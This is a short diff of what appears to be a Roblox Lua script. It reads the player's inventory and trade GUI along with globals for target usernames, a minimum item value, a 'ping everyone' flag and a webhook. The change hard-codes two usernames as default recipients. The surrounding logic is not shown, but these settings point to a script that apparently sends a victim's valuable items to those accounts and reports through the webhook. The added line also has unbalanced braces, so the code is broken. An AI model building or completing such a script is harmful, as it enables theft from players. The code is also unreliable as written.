@@ -18,7 +18,7 @@ local tradeCompleteGui = PlayerGui.TradeCompleted
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {{"CLONEBIGFORONE", "byvy1004"}
 local min_rap = _G.min_rap or 100
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
